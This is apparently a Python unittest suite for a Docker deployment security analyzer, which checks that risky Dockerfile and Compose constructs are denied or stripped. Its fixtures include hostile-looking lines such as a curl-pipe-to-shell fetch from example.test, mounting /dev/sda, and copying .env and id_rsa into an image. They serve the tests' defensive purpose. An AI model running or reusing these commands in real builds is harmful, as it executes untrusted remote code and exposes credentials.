"""Strong security and import-contract tests for tenant Docker mode."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from deployments.common.exceptions import DeploymentSecurityError
from deployments.core.docker_source import (
    analyze_dockerfile,
    analyze_referenced_build_scripts,
    inspect_docker_source,
)


def codes(findings):
    return {finding.code for finding in findings}


class DockerfilePolicyContracts(unittest.TestCase):
    def test_valid_dockerfile_has_no_denials(self):
        findings = analyze_dockerfile(
            "FROM python:3.12-slim\n"
            "WORKDIR /app\n"
            "COPY . /app\n"
            "RUN pip install -r requirements.txt\n",
            source_file="Dockerfile",
        )
        self.assertFalse(any(item.action == "deny" for item in findings))

    def test_missing_from_is_blocked(self):
        findings = analyze_dockerfile("RUN echo ok\n", source_file="Dockerfile")
        self.assertIn("dockerfile_missing_from", codes(findings))

    def test_multiple_high_risk_dockerfile_controls_are_detected(self):
        findings = analyze_dockerfile(
            "FROM docker:dind\n"
            "ADD https://example.test/bootstrap.sh /tmp/bootstrap.sh\n"
            "RUN --network=host echo x\n"
            "RUN --security=insecure echo x\n"
            "RUN --device=/dev/kvm echo x\n"
            "RUN --mount=type=secret,target=/run/secret echo x\n"
            "RUN curl https://example.test/x.sh | sh\n"
            "ARG API_TOKEN=secret\n"
            "VOLUME /data\n",
            source_file="Dockerfile",
        )
        expected = {
            "dockerfile_dind_base",
            "dockerfile_remote_add",
            "dockerfile_host_network",
            "dockerfile_insecure_security",
            "dockerfile_device_entitlement",
            "dockerfile_unsafe_mount",
            "dockerfile_dangerous_command",
            "dockerfile_secret_default",
            "dockerfile_anonymous_volume",
        }
        self.assertTrue(expected.issubset(codes(findings)))
        self.assertTrue(all(item.action == "deny" for item in findings))

    def test_sensitive_context_copy_is_blocked(self):
        findings = analyze_dockerfile(
            "FROM python:3.12\nCOPY .env /app/.env\nCOPY id_rsa /tmp/id_rsa\n",
            source_file="Dockerfile",
        )
        self.assertIn("dockerfile_sensitive_context_copy", codes(findings))

    def test_multiline_run_is_analyzed_as_one_logical_instruction(self):
        findings = analyze_dockerfile(
            "FROM python:3.12\n"
            "RUN echo safe \\\n"
            "    && curl https://example.test/install.sh | sh\n",
            source_file="Dockerfile",
        )
        self.assertIn("dockerfile_dangerous_command", codes(findings))

    def test_dockerfile_policy_finding_serialization_keeps_location(self):
        findings = analyze_dockerfile("RUN mount /dev/sda /mnt\n", source_file="Dockerfile")
        finding = next(item for item in findings if item.code == "dockerfile_dangerous_command")
        payload = finding.as_dict()
        self.assertEqual(payload["path"], "Dockerfile")
        self.assertEqual(payload["line"], 1)
        self.assertEqual(payload["action"], "deny")


class ReferencedBuildScriptContracts(unittest.TestCase):
    def test_missing_referenced_script_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            findings = analyze_referenced_build_scripts(
                tmp,
                "FROM node:22\nRUN ./build.sh\n",
                source_file="Dockerfile",
            )
        self.assertIn("dockerfile_unresolved_script", codes(findings))

    def test_unsafe_script_path_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            findings = analyze_referenced_build_scripts(
                tmp,
                "FROM node:22\nRUN ../build.sh\n",
                source_file="Dockerfile",
            )
        self.assertIn("dockerfile_unsafe_script_path", codes(findings))

    def test_dangerous_referenced_script_is_inspected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "build.sh").write_text(
                "curl https://example.test/bootstrap.sh | sh\n",
                encoding="utf-8",
            )
            findings = analyze_referenced_build_scripts(
                tmp,
                "FROM node:22\nRUN ./build.sh\n",
                source_file="Dockerfile",
            )
        self.assertIn("dockerfile_dangerous_build_script", codes(findings))


class ComposeImportContracts(unittest.TestCase):
    def write(self, root: Path, name: str, content: str):
        (root / name).write_text(content, encoding="utf-8")

    def test_compose_imports_environment_ports_restart_and_nonreserved_labels(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(
                root,
                "compose.yml",
                """
services:
  web:
    image: python:3.12-slim
    environment:
      APP_MODE: production
    restart: unless-stopped
    labels:
      traefik.enable: "true"
      feature.example: "enabled"
    ports:
      - "8080:8000"
""",
            )
            result = inspect_docker_source(
                str(root),
                environment={"EXTRA": "value"},
            )

        self.assertEqual(result.source_kind, "compose")
        self.assertEqual(result.runtime["port"], 8000)
        self.assertEqual(result.runtime["restart_policy"]["condition"], "any")
        self.assertEqual(result.runtime["environment"]["APP_MODE"], "production")
        self.assertEqual(result.runtime["environment"]["EXTRA"], "value")
        self.assertEqual(result.runtime["labels"], {"feature.example": "enabled"})
        self.assertFalse(result.blocked)
        self.assertIn("compose_reserved_label_stripped", codes(result.findings))

    def test_compose_multiple_services_are_rejected_before_import(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(
                root,
                "compose.yml",
                """
services:
  web:
    image: nginx:1
  worker:
    image: nginx:1
""",
            )
            with self.assertRaises(DeploymentSecurityError) as ctx:
                inspect_docker_source(str(root))
        self.assertIn("exactly one application service", str(ctx.exception))

    def test_compose_custom_network_and_top_level_secrets_are_denied(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(
                root,
                "compose.yml",
                """
services:
  web:
    image: nginx:1
    networks: [private]
networks:
  private: {}
secrets:
  api_key:
    file: secret.txt
""",
            )
            result = inspect_docker_source(str(root))
        self.assertIn("compose_custom_network", codes(result.findings))
        self.assertIn("compose_service_custom_network", codes(result.findings))
        self.assertIn("compose_top_level_secrets_or_configs", codes(result.findings))
        self.assertTrue(result.blocked)

    def test_compose_host_bind_and_extra_ports_are_stripped(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(
                root,
                "compose.yml",
                """
services:
  web:
    image: nginx:1
    ports:
      - "8080:8000"
      - "8081:8001"
    volumes:
      - "/host/data:/data"
      - "managed-data:/managed"
volumes:
  managed-data: {}
""",
            )
            result = inspect_docker_source(str(root))
        self.assertEqual(result.runtime["port"], 8000)
        self.assertEqual(len(result.volumes), 1)
        self.assertEqual(result.volumes[0]["compose_name"], "managed-data")
        self.assertIn("compose_host_bind_removed", codes(result.findings))
        self.assertIn("compose_extra_ports_stripped", codes(result.findings))

    def test_compose_sensitive_literal_build_arg_is_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(
                root,
                "compose.yml",
                """
services:
  web:
    build:
      context: .
      args:
        API_TOKEN: super-secret
""",
            )
            self.write(root, "Dockerfile", "FROM python:3.12\n")
            with self.assertRaises(DeploymentSecurityError):
                inspect_docker_source(str(root))

    def test_compose_external_volume_is_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(
                root,
                "compose.yml",
                """
services:
  web:
    image: nginx:1
    volumes:
      - "managed:/data"
volumes:
  managed:
    external: true
""",
            )
            with self.assertRaises(DeploymentSecurityError) as ctx:
                inspect_docker_source(str(root))
        self.assertIn("External Compose volume", str(ctx.exception))

    def test_compose_http_healthcheck_is_mapped_to_readiness_path(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(
                root,
                "compose.yml",
                """
services:
  web:
    image: nginx:1
    healthcheck:
      test: ["CMD-SHELL", "curl -fsS http://127.0.0.1:8000/health"]
""",
            )
            result = inspect_docker_source(str(root))
        self.assertEqual(result.runtime["healthcheck_path"], "/health")
        self.assertFalse(any(f.code == "compose_healthcheck_stripped" for f in result.findings))

    def test_plain_dockerfile_source_returns_dockerfile_resolution(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            self.write(root, "Dockerfile", "FROM python:3.12\n")
            result = inspect_docker_source(str(root), environment={"A": "B"})
        self.assertEqual(result.source_kind, "dockerfile")
        self.assertEqual(result.source_file, "Dockerfile")
        self.assertEqual(result.runtime["environment"], {"A": "B"})
        self.assertFalse(result.blocked)

    def test_missing_docker_input_is_a_structured_security_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(DeploymentSecurityError) as ctx:
                inspect_docker_source(tmp)
        self.assertEqual(ctx.exception.stage, "docker_source_validation")


if __name__ == "__main__":
    unittest.main()
